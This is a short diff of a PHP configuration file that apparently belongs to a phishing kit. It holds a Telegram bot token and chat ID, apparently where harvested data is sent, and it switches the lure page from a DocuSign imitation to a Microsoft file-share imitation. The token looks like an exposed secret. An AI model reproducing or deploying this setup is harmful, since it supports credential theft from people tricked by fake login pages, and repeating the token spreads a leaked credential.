@@ -7,6 +7,6 @@ $api_prefix = "rrdmenva";
 $telegram_bot_token = "8262420809:AAHTwbxwnRs5ZS22zUkwAqoseNqPfNDdB00";
 $telegram_chat_id = "5793923604";
 
-$page_name = "docusign_1";
+$page_name = "ms_fileshare_1";
 
 ?>
